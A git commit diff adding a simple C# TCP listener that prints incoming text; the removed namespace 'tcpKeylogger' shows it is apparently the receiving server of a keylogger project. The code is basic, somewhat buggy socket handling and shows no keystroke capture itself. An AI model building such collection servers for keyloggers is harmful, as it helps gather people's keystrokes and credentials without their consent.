f948ef767d743db07bf15fbd737cc58265c9b952
QwertyAscii <QwertyAscii@github.com>
2021-07-12 02:48:30 +0300

    Add server sided features such as TCP connection, socket creation and data decoding

--- server/main.cs
+++ server/main.cs
@@ -1,14 +1,73 @@
 using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Net;
+using System.Net.Sockets;
 
-public class TcpListener;
-
-namespace tcpKeylogger{
-    
-    class Program
+class TcpListener
+{
+    public static IPAddress getIp()
     {
-        static void Main(string[] args){
-            Console.WriteLine("Test");
-            Console.ReadKey();
+        string host = Dns.GetHostName();
+        var address = Dns.GetHostEntry(host);
+
+        foreach (var ip in address.AddressList)
+        {
+            return ip;
         }
+        return null;
+    }
+
+    public static void getData(Socket handler, Socket listener)
+    {
+        String data = null;
+        byte[] bytes = null;
+
+        while (true)
+        {
+                        
+            bytes = new byte[1024];
+            int bytesRec = handler.Receive(bytes);
+            data += Encoding.ASCII.GetString(bytes, 0, bytesRec);
+
+            if (data.IndexOf("8==.") > -1)
+            {
+                break;
+            }
+            
+            Console.WriteLine("TEXT RECEIVED: " + data);
+
+        listener.Listen(100);
+        handler = listener.Accept();
+
+        }
+    }
+
+    public static void socketInit(IPEndPoint endPoint, IPAddress ip)
+    {
+        Socket listener = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+        listener.Bind(endPoint);
+
+        listener.Listen(100);
+        Console.WriteLine("Awaiting connection...\n");
+        Socket handler = listener.Accept();
+        Console.WriteLine("Connected!");
+
+        getData(handler, listener);
+    }
+
+    public static void Main(string[] Args)
+    {
+        //try{
+        Int32 port = 6942;
+        IPAddress ip = getIp();
+        IPEndPoint ipEndPoint = new IPEndPoint(ip, port);
+        Console.WriteLine("ENDPOINT:" + ipEndPoint);
+
+        socketInit(ipEndPoint, ip);
+        //}
+
+
     }
 }
